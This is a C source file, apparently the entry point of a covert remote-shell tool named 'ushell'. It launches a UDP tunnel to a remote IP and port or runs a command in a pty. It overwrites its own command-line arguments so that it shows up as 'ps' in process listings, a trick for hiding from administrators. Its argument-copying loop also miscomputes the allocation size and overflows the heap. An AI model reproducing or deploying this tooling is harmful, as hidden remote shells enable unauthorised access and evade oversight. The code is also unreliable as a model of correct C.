/*
ushell -u ip port : create a udp tunel to remote ip and port
ushell -p [cmd] [args] : run a cmd in pty 

*/


#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

extern int pty_main(int, char**);
extern int utel_main(int, char**);

int main(int argc, char **argv){
  
  if(argc < 3){
    printf("Usage:\n"
           "ushell -u ip port : create a udp tunel to remote ip and port\n"
           "ushell -p [cmd] [args] : run a cmd in pty\n"
          );
    return -1;
  }
  
  char **aargv = (char **)malloc(sizeof(char *) * (argc + 1));
  aargv[argc] = NULL;
  int i;
  for (i=0; i<argc; i++){
    aargv[i] = (char *)malloc(strlen(argv[i] + 1));
    strcpy(aargv[i],argv[i]);
  }

  //hide cmd line
  strncpy(argv[0], "ps", strlen(argv[0]));
  for (i=1; i<argc; i++){
    strncpy(argv[i], " ", strlen(argv[i]));
  }

  if(strncmp(aargv[1], "-u", 3) == 0){
    utel_main(argc, aargv);
  }
  
  if(strncmp(aargv[1], "-p", 3) == 0){
    pty_main(argc, aargv);
  }

}
